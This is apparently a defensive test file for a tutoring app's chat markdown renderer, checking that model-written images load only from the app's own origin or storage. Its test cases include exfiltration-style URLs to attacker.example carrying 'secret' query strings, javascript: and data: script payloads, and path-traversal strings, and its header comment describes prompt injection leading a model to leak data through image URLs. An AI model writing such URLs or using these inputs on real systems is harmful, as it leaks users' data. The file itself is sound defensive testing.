// @vitest-environment jsdom
/**
 * Model-written markdown must not fetch an external image: the image URL can
 * carry whatever the model was induced to write (prompt injection through a
 * student's own documents). Only same-origin, data: and the app's own
 * Supabase storage images are drawn; anything else becomes a link.
 */
import { afterEach, describe, expect, it, vi } from "vitest";
import { cleanup, render, screen } from "@testing-library/react";

vi.mock("./MermaidBlock", () => ({ MermaidBlock: () => null }));
vi.mock("./FunctionPlot", () => ({ FunctionPlot: () => null }));

import { MarkdownChat } from "./MarkdownChat";
import { isAllowedMarkdownImageSrc } from "@/lib/markdownImages";

const SUPA = "https://abcd1234.supabase.co";
const CTX = { origin: "https://saplinglearn.com", supabaseUrl: SUPA };

afterEach(() => {
  cleanup();
  vi.unstubAllEnvs();
});

describe("isAllowedMarkdownImageSrc", () => {
  it.each([
    "/sapling-icon.svg",
    "achievements/stage.png",
    "https://saplinglearn.com/og.png",
    "data:image/png;base64,iVBORw0KGgo=",
    "data:image/svg+xml;utf8,<svg/>",
    `${SUPA}/storage/v1/object/public/chat-images/r/u.png`,
  ])("draws %s", (src) => {
    expect(isAllowedMarkdownImageSrc(src, CTX)).toBe(true);
  });

  it.each([
    "https://attacker.example/x.png?q=secret",
    "//attacker.example/x.png",
    "http://saplinglearn.com/og.png",
    "https://saplinglearn.com.attacker.example/x.png",
    `${SUPA}/rest/v1/users`,
    `${SUPA}/storage/v1/object/public/../../rest/v1/users`,
    `${SUPA}/storage/v1/object/sign/chat-images/r/u.png`,
    "https://other.supabase.co/storage/v1/object/public/a.png",
    "data:text/html,<script>alert(1)</script>",
    "javascript:alert(1)",
    "blob:https://saplinglearn.com/1234",
    "",
    undefined,
  ])("refuses %s", (src) => {
    expect(isAllowedMarkdownImageSrc(src, CTX)).toBe(false);
  });

  it("refuses storage URLs when the build names no Supabase project", () => {
    expect(
      isAllowedMarkdownImageSrc(`${SUPA}/storage/v1/object/public/a.png`, { origin: CTX.origin }),
    ).toBe(false);
  });
});

describe("MarkdownChat images", () => {
  it("draws a same-origin image", () => {
    const { container } = render(<MarkdownChat>{"![logo](/sapling-icon.svg)"}</MarkdownChat>);
    const img = container.querySelector("img");
    expect(img?.getAttribute("src")).toBe("/sapling-icon.svg");
  });

  it("draws an image from the app's own storage bucket", () => {
    vi.stubEnv("NEXT_PUBLIC_SUPABASE_URL", SUPA);
    const src = `${SUPA}/storage/v1/object/public/chat-images/r/u.png`;
    const { container } = render(<MarkdownChat>{`![upload](${src})`}</MarkdownChat>);
    expect(container.querySelector("img")?.getAttribute("src")).toBe(src);
  });

  it("never fetches an external image; offers it as a link instead", () => {
    const src = "https://attacker.example/pixel.png?notes=secret";
    const { container } = render(<MarkdownChat>{`Here: ![diagram](${src})`}</MarkdownChat>);
    expect(container.querySelector("img")).toBeNull();
    const link = screen.getByTestId("markdown-image-blocked");
    expect(link.tagName).toBe("A");
    expect(link.getAttribute("href")).toBe(src);
    expect(link.getAttribute("rel")).toBe("noopener noreferrer nofollow");
    expect(link.textContent).toBe("[image: diagram]");
  });

  it("drops a GeoGebra directive whose id is not a material id", () => {
    const { container } = render(
      <MarkdownChat>{'::geogebra{id="x/../../?q=secret"}\n\n::geogebra{id="kxcdsjqs"}'}</MarkdownChat>,
    );
    const frames = container.querySelectorAll("iframe");
    expect(frames).toHaveLength(1);
    expect(frames[0].getAttribute("src")).toBe("https://www.geogebra.org/material/iframe/id/kxcdsjqs");
  });
});
